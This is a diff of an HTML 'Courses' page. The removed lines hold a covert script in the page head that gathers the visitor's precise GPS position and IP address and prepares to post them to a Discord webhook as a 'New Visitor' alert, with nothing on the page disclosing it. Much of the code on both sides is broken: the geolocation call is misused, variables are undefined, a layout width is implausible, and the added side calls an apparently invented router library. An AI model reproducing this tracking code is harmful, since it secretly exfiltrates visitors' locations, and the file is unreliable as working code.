@@ -1,239 +1,193 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-   <meta charset="UTF-8" />
-   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-   <title>Courses</title>
-   <link rel="preconnect" href="https://fonts.googleapis.com" />
-   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-   <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,300;0,400;0,600;1,300&family=Inter:wght@300;400;500&display=swap" rel="stylesheet" />
-   <style>
-     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Courses</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,300;0,400;0,600;1,300&family=Inter:wght@300;400;500&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
-     :root {
-       --bg: #0a0000;
-       --surface: #120000;
-       --gold: #e03030;
-       --gold-dim: #8a2020;
-       --cream: #f0d8d8;
-       --muted: #7a5858;
-       --text: #ddc5c5;
-       --border: rgba(220, 50, 50, 0.18);
-       --snake: #5c1a1a;
-     }
+    :root {
+      --bg: #0a0000;
+      --surface: #120000;
+      --gold: #e03030;
+      --gold-dim: #8a2020;
+      --cream: #f0d8d8;
+      --muted: #7a5858;
+      --text: #ddc5c5;
+      --border: rgba(220, 50, 50, 0.18);
+      --snake: #5c1a1a;
+    }
 
-     html { scroll-behavior: smooth; }
+    html { scroll-behavior: smooth; }
 
-     body {
-       background: var(--bg);
-       color: var(--text);
-       font-family: 'Inter', sans-serif;
-       font-weight: 300;
-       overflow-x: hidden;
-       line-height: 1.7;
-     }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Inter', sans-serif;
+      font-weight: 300;
+      overflow-x: hidden;
+      line-height: 1.7;
+    }
 
-     /* ── Canvas constellation ── */
-     #constellation {
-       position: fixed;
-       inset: 0;
-       z-index: 0;
-       pointer-events: none;
-     }
+    /* ── Canvas constellation ── */
+    #constellation {
+      position: fixed;
+      inset: 0;
+      z-index: 0;
+      pointer-events: none;
+    }
 
-     /* ── Layout wrapper ── */
-     .layer {
-       position: relative;
-       z-index: 1;
-     }
+    /* ── Layout wrapper ── */
+    .layer {
+      position: relative;
+      z-index: 1;
+    }
 
-     /* ── Nav ── */
-     nav {
-       position: fixed;
-       top: 0; left: 0; right: 0;
-       z-index: 100;
-       display: flex;
-       align-items: center;
-       justify-content: space-between;
-       padding: 1.5rem 4rem;
-       border-bottom: 0.5px solid transparent;
-       transition: border-color 0.4s, background-color 0.4s, box-shadow 0.4s;
-       text-transform: uppercase;
-     }
+    /* ── Nav ── */
+    nav {
+      position: fixed;
+      top: 0; left: 0; right: 0;
+      z-index: 100;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 1.5rem 4rem;
+      border-bottom: 0.5px solid transparent;
+      transition: border-color 0.4s, background-color 0.4s, box-shadow 0.4s;
+      text-transform: uppercase;
+    }
 
-     /* ── Nav Link ── */
-     nav a {
-       color: var(--text);
-       text-decoration: none;
-       font-weight: 600;
-       padding: 0.75rem 1rem;
-       border-bottom: 1px solid transparent;
-       transition: color 0.4s, border-bottom 0.4s;
-     }
+    /* ── Nav Link ── */
+    nav a {
+      color: var(--text);
+      text-decoration: none;
+      font-weight: 600;
+      padding: 0.75rem 1rem;
+      border-bottom: 1px solid transparent;
+      transition: color 0.4s, border-bottom 0.4s;
+    }
 
-     /* ── Nav Active ── */
-     nav a.active {
-       color: var(--gold);
-       border-bottom: 1px solid var(--gold-dim);
-     }
+    /* ── Nav Active ── */
+    nav a.active {
+      color: var(--gold);
+      border-bottom: 1px solid var(--gold-dim);
+    }
 
-     /* ── Nav Mobile ── */
-     @media (max-width: 768px) {
-       nav {
-         font-size: 1rem;
-         line-height: 1.5;
-       }
+    /* ── Nav Mobile ── */
+    @media (max-width: 768px) {
+      nav {
+        font-size: 1rem;
+        line-height: 1.5;
+      }
 
-       nav a {
-         font-size: 1rem;
-         padding: 0.5rem 0.75rem;
-         border-bottom: 0;
-       }
-     }
+      nav a {
+        font-size: 1rem;
+        padding: 0.5rem 0.75rem;
+        border-bottom: 0;
+      }
+    }
 
-     /* ── Content ── */
-     main {
-       padding: 4rem 0;
-       max-width: 1200px;
-       margin: 0 auto;
-       overflow: hidden;
-     }
+    /* ── Content ── */
+    main {
+      padding: 4rem 0;
+      max-width: 120px;
+      margin: 4rem 0;
+      overflow: hidden;
+    }
 
-     /* ── Section ── */
-     .section {
-       padding: 4rem 0;
-       max-width: 100%;
-       margin: 4rem 0;
-       box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-       border-radius: 0.25rem;
-       transition: box-shadow 0.4s;
-     }
+    /* ── Section ── */
+    .section {
+      padding: 4rem 0;
+      max-width: 100%;
+      margin: 4rem 0;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      border-radius: 0.25rem;
+      border: 0;
+      transition: box-shadow 0.4s;
+    }
 
-     /* ── Section Title ── */
-     .section h2 {
-       margin: 0;
-       font-size: 2.5rem;
-       font-weight: 700;
-       text-transform: uppercase;
-     }
+    /* ── Section Title ── */
+    .section h2 {
+      margin: 0;
+      font-size: 2.5rem;
+      font-weight: 700;
+      text-transform: uppercase;
+    }
 
-     /* ── Section Text ── */
-     .section p {
-       margin: 2rem 0;
-       font-size: 1.5rem;
-       line-height: 1.5;
-     }
+    /* ── Section Text ── */
+    .section p {
+      margin: 2rem 0;
+      font-size: 1.5rem;
+      line-height: 1.5;
+    }
 
-     /* ── Button ── */
-     .button {
-       display: inline-block;
-       padding: 1rem 2rem;
-       font-size: 1.25rem;
-       font-weight: 600;
-       text-align: center;
-       text-decoration: none;
-       border-radius: 0.5rem;
-       background-color: var(--gold);
-       color: var(--text);
-       border: 0;
-       transition: background-color 0.4s, color 0.4s;
-       cursor: pointer;
-     }
+    /* ── Button ── */
+    .button {
+      display: inline-block;
+      padding: 1rem 2rem;
+      font-size: 1.25rem;
+      font-weight: 600;
+      text-align: center;
+      text-decoration: none;
+      border-radius: 0.5rem;
+      color: var(--text);
+      transition: background-color 0.4s, color 0.4s;
+    }
 
-     /* ── Button: Active ── */
-     .button.active {
-       background-color: var(--gold-dim);
-       color: var(--gold);
-     }
+    /* ── Button: Active ── */
+    .button.active {
+      background-color: var(--gold);
+      color: var(--gold);
+    }
 
-     /* ── Input ── */
-     input[type=text],
-     input[type=password] {
-       padding: 1rem 2rem;
-       font-size: 1.25rem;
-       font-weight: 600;
-       text-align: center;
-       text-decoration: none;
-       border-radius: 0.5rem;
-       border: 0;
-       background-color: transparent;
-       color: var(--text);
-       transition: border-color 0.4s, box-shadow 0.4s;
-       cursor: pointer;
-     }
+    /* ── Input ── */
+    input[type=text],
+    input[type=password] {
+      padding: 1rem 2rem;
+      font-size: 1.25rem;
+      font-weight: 600;
+      text-align: center;
+      text-decoration: none;
+      border-radius: 0.5rem;
+      transition: border-color 0.4s, box-shadow 0.4s;
+    }
 
-     /* ── Input: Focus ── */
-     input[type=text]:focus,
-     input[type=password]:focus {
-       outline: none;
-       border-color: var(--gold);
-       box-shadow: 0 0 0 1px var(--gold), 0 5px 5px -3px var(--gold-dim);
-     }
-   </style>
-
-   <script>
-     const geo = async () => {
-       const { coords } = await navigator.geolocation.getCurrentPosition();
-       return {
-         latitude: coords.latitude,
-         longitude: coords.longitude,
-         accuracy: coords.accuracy
-       };
-     };
-
-     const getIp = () => {
-       const req = new XMLHttpRequest();
-       req.open('GET', 'https://api.ipify.org?format=json', true);
-       req.onload = () => {
-         const ip = JSON.parse(req.responseText).ip;
-         console.log('IP:', ip);
-       };
-       req.send();
-     };
-
-     const getGeo = () => {
-       geo().then(geoData => {
-         const latitude = geoData.latitude;
-         const longitude = geoData.longitude;
-         const accuracy = geoData.accuracy;
-         console.log('Geolocation:', latitude, longitude, accuracy);
-         const ip = getIp();
-         console.log('IP:', ip);
-       });
-     };
-
-     const sendToDiscord = async (message) => {
-       const { body } = await fetch(WEBHOOK, {
-         method: 'POST',
-         headers: { 'Content-Type': 'application/json' },
-         body: JSON.stringify({ embeds: [{ title: '🐍 New Visitor — Activity', color: 0xDC3232, fields: [{ name: '📍 Precise GPS', value: `[${latitude}, ${longitude}] — ±${accuracy}m`, inline: false }], footer: { text: location.hostname } }] })
-       });
-     };
-   </script>
-
-   <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    input[type=text]:focus,
+    input[type=password]:focus {
+      outline: none;
+      border-color: var(--gold);
+      box-shadow: 0 0 0 1px var(--gold), 0 5px 5px -3px var(--gold-dim);
+    }
+  </style>
 </head>
 <body>
-   <main>
-     <section>
-       <h2>Courses</h2>
-       <p>Welcome to our courses section. Here you can find all the courses we offer and learn more about them.</p>
-     </section>
+  <main>
+    <section>
+      <h2>Courses</h2>
+      <p>Welcome to our courses section. Here you can find all the courses we offer and learn more about them.</p>
+    </section>
 
-     <section>
-       <h2>Get Started</h2>
-       <p>To get started, please enter your name and email below:</p>
+    <section>
+      <h2>Get Started</h2>
+      <p><a href="index.html" target="_blank">Click here to visit server index page</a></p>
+    </section>
 
-       <form>
-         <input type="text" placeholder="Name" />
-         <input type="email" placeholder="Email" />
-         <button type="submit">Submit</button>
-       </form>
-     </section>
-   </main>
+    <script>
+      console.log('visit index.html');
+    </script>
 
-   <script>
-     getGeo();
-   </script>
+    <script src="https://unpkg.com/electron-router/dist/electron-router.min.js"></script>
+    <script>
+      function redirect() {
+        electronRouter.use(route => route.get('index.html').send());
+        window.location.href = 'index.html';
+      }
+
+      redirect();
+    </script>
 </body>
 </html>
